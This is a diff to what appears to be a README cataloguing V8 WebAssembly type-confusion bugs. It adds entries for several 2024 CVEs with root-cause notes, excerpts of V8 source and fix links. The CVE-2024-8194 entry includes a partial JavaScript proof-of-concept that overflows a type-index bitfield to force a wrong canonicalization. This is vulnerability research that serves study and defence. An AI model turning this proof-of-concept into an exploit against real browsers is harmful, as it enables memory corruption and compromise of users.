@@ -13,10 +13,15 @@
   * [Arbitrary WASM type confusion due to module confusion in wasm-to-js tier-up](#arbitrary-wasm-type-confusion-due-to-module-confusion-in-wasm-to-js-tier-up)
 - [Wasm Module](#wasm-module)
   * [Type confusion due to improper WASM module size check in `AsyncStreamingDecoder`](#type-confusion-due-to-improper-wasm-module-size-check-in-asyncstreamingdecoder)
+  * [CVE-2024-2887 - Improper validation when decoding types in `TypeSectionDecoder`](#CVE-2024-2887-Improper-validation-when-decoding-types-in-TypeSectionDecoder)
 - [Wasm Tag](#wasm-tag)
   * [WASM type confusion due to imported tag signature subtyping](#wasm-type-confusion-due-to-imported-tag-signature-subtyping)
 - [JSPI](#jspi)
   * [JSPI stack switching breaks lazy deoptimization guarantees, leading to type confusion](#jspi-stack-switching-breaks-lazy-deoptimization-guarantees-leading-to-type-confusion)
+- [Wasm CanonicalType](#Wasm-CanonicalType)
+  * [CVE-2024-6100 - Type confusion between canonicalType and HeapType/ValueType](CVE-2024-6100-Type-confusion-between-canonicalType-and-HeapType-ValueType)
+  * [CVE-2024-8194 - Another confusion between CanonicalType and ValueType](CVE-2024-8194-Another-confusion-between-CanonicalType-and-ValueType)
+  * [CVE-2024-9859 - Confusion between ValueType and CanonicalType in HE](CVE-2024-9859-Confusion-between-ValueType-and-CanonicalType-in-HE)
 
 <!-- tocstop -->
 
@@ -145,6 +150,7 @@ dispatch table for indirect function calls instead.
 ### Arbitrary WASM type confusion due to module confusion in wasm-to-js tier-up
 
 - Isuse: https://issues.chromium.org/issues/371565065
+Improper signature when re-importing an imported and then exported from another module. It calls from module B, but its signature is from module A, which causes inconsistency.
 
 [testcase](pocs/poc-371565065.js)
 
@@ -156,6 +162,13 @@ dispatch table for indirect function calls instead.
 - Issue:  https://issues.chromium.org/issues/368241697
 
 [testcase]()
+
+### CVE-2024-2887 - Improper validation when decoding types in `TypeSectionDecoder` 
+
+Its root cause being improper implementation, which forget to boundcheck number of types when accessing standalone type (which is not recursive type)
+
+Reported issue: https://issues.chromium.org/issues/330588502
+Fix: https://chromium-review.googlesource.com/c/v8/v8/+/5378419
 
 ## Wasm Tag
 
@@ -173,4 +186,127 @@ dispatch table for indirect function calls instead.
 - Issue: https://issues.chromium.org/issues/365376497
 
 [testcase](pocs/poc-365376497.js)
+
+## Wasm CanonicalType
+
+### CVE-2024-6100 - Type confusion between canonicalType and HeapType/ValueType
+In wasm proposal MVP, when check type equivalency, recursive type must be convert to iso-recursive type first. To represent equivalency between two types, WasmGC allow canonicalize type to support type comparison between recursive groups in different modules. 
+
+The implementation of V8 would be:
+```
+https://issues.chromium.org/344608204#attachment56870020
+1. Canonicalize type indexes in a recursive group by the following rule:
+   1. Type indexes already defined (outside of its recursive group) -> use the already canonicalized value
+   2. Type indexes representing a different type within the same group -> compute relative type index from the first type and mark as relative
+2. If the canonicalized recursive group already exists in the database, use the saved indexes
+3. Else, save the recursive group into the database and create new indexes (incrementally)
+```
+Which therefore give each type another index, canonical_idx. This one is to denote equality of 2 types inside the recursive group. 
+
+Each type's canonical_idx is a uint32_t, and is stored in a vector in class TypeCanonicalizer. canonical_idx should not be confused with heap_type_idx.
+
+While heap_type_idx has a upper bound (kV8MaxWasmTypes), canonical_idx does not. 
+
+However, in some cases, canonical_idx is parsed to where heap_type should be:
+
+```cpp
+namespace wasm {
+MaybeHandle<Object> JSToWasmObject(Isolate* isolate, Handle<Object> value,
+                                   ValueType expected_canonical,
+                                   const char** error_message) {
+  //...
+  switch (expected_canonical.heap_representation_non_shared()) {        //
+    //...
+    case HeapType::kAny: {                                          // [!] all non-null JS values allowed
+      if (IsSmi(*value)) return CanonicalizeSmi(value, isolate);
+      if (IsHeapNumber(*value)) {
+        return CanonicalizeHeapNumber(value, isolate);
+      }
+      if (!IsNull(*value, isolate)) return value;
+      *error_message = "null is not allowed for (ref any)";
+      return {};
+    }
+    //...
+  }
+  //...
+}
+```
+Which eventually leads to type confusion.
+
+Reported issue: https://issues.chromium.org/issues/344608204
+
+Fix: https://chromium-review.googlesource.com/c/v8/v8/+/5604265
+
+### CVE-2024-8194 - Another confusion between CanonicalType and ValueType
+Storing canonical_type_idx into wasm::ValueType
+```cpp
+ValueType TypeCanonicalizer::CanonicalizeValueType(
+    const WasmModule* module, ValueType type,
+    uint32_t recursive_group_start) const {
+  if (!type.has_index()) return type;
+  return type.ref_index() >= recursive_group_start
+             ? ValueType::CanonicalWithRelativeIndex(
+                   type.kind(), type.ref_index() - recursive_group_start)
+             : ValueType::FromIndex(
+                   type.kind(),
+                   module->isorecursive_canonical_type_ids[type.ref_index()]);  // [!]
+}
+```
+canonical_type_idx max was at 1 << 20, but wasm::ValueType's max at 1000000. This could lead to field overflow.
+```javascript 
+/*
+private:
+      // {hash_value} directly reads {bit_field_}.
+      friend size_t hash_value(ValueType type);
+    
+      using KindField = base::BitField<ValueKind, 0, kKindBits>;                // 5
+      using HeapTypeField = KindField::Next<uint32_t, kHeapTypeBits>;           // 20
+      // Marks a type as a canonical type which uses an index relative to its
+      // recursive group start. Used only during type canonicalization.
+      using CanonicalRelativeField = HeapTypeField::Next<bool, 1>;
+    */
+    
+    let builder = new WasmModuleBuilder();
+    // target rec group
+    builder.startRecGroup();
+    builder.addStruct([makeField(wasmRefType(3), true)]);   // tidx 0, cidx 3 / field { (HeapTypeField 3, CanonicalRelativeField 1) = 0x100003 } 
+    builder.addArray(kWasmI32, true);                       // tidx 1, cidx 4
+    builder.addArray(kWasmI32, true);                       // tidx 2, cidx 5
+    builder.addStruct([makeField(kWasmExternRef, true)]);   // tidx 3, cidx 6 (ridx 3)
+    builder.endRecGroup();
+    let instance = builder.instantiate();   // total canon 7
+
+    reserve(1000000 - 7);                   // total canon 1000000
+    reserve(0x100003 - 1000000);            // total canon 0x1000003
+
+    builder = new WasmModuleBuilder();
+    let $s1 = builder.addStruct([makeField(kWasmI32, true)]);   // tidx 0, cidx 0x100003
+    // target rec group
+    builder.startRecGroup();
+    let $s2 = builder.addStruct([makeField(wasmRefType(4), true)]);     // tidx 1, cidx 3 / field { (HeapTypeField 3, CanonicalRelativeField 1) = 0x100003 } 
+    builder.addArray(kWasmI32, true);                                   // tidx 2, cidx 4
+    builder.addArray(kWasmI32, true);                                   // tidx 3, cidx 5
+    let $s3 = builder.addStruct([makeField(kWasmExternRef, true)]);     // tidx 4, cidx 6 (ridx 3)
+    builder.endRecGroup();
+    // rec group that canonicalizes into target rec group
+    builder.startRecGroup();
+    let $s4 = builder.addStruct([makeField(wasmRefType($s1), true)]);   // tidx 5, cidx 3? / field { (HeapTypeField 0x100003, CanonicalRelativeField 0) = 0x100003 } 
+    builder.addArray(kWasmI32, true);                                   // tidx 6, cidx 4?
+    builder.addArray(kWasmI32, true);                                   // tidx 7, cidx 5?
+    let $s5 = builder.addStruct([makeField(kWasmExternRef, true)]);     // tidx 8, cidx 6?
+    builder.endRecGroup();
+```
+The cidx of 0x100003 is loaded into HeapTypeField, overflowing into CanonicalRelativeField into 1, which make RecGroup 2 is canonicalized into RecGroup 1. However, they are not equivalent.
+
+Reported issue: https://issues.chromium.org/issues/360533914
+
+### CVE-2024-9859 - Confusion between ValueType and CanonicalType in HE
+When encoding a JS value in a wasm exception, it should be canonicalized first, since JSToWasmObject takes CanonicalValueType as an argument:
+```
+MaybeHandle<Object> JSToWasmObject(Isolate* isolate, Handle<Object> value,
+                                   CanonicalValueType expected,
+                                   const char** error_message) {
+```
+However, it does not canonicalize before go to JS->Wasm wrapper. Therefore, it passes ValueType to JSToWasmObject instead of CanonicalValueType
+Fix: https://chromium-review.googlesource.com/c/v8/v8/+/5633661
 
